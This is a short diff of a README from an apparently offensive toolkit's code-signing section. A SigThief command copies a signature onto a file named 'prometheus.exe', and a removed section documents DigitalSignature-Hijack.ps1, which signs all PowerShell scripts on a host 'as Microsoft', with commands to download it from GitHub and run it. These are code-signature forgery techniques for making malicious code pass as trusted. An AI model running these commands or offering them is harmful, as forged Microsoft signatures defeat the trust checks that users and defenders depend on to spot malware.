@@ -38,22 +38,3 @@ iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Sign-E
 ```python   
 python Sigthief.py -i "sigcheck.exe" -t "prometheus.exe" -o "signed-prometheus.exe"
 ```
-
-<br />
-
-## DigitalSignature-Hijack.ps1
-
-|Script Name|Description|Privileges|Notes|
-|---|---|---|---|
-|[DigitalSignature-Hijack](https://github.com/r00t-3xp10it/redpill/blob/main/lib/Sign-Executables/DigitalSignature-Hijack.ps1)|Digitally sign all powershell scripts on the host as Microsoft|Administrator|Author: @netbiosX|
-
-**download script:**
-```powershell
-iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Sign-Executables/DigitalSignature-Hijack.ps1" -OutFile "DigitalSignature-Hijack.ps1"
-```
-
-**execute:**
-```powershell   
-.\DigitalSignature-Hijack.ps1
-```
-
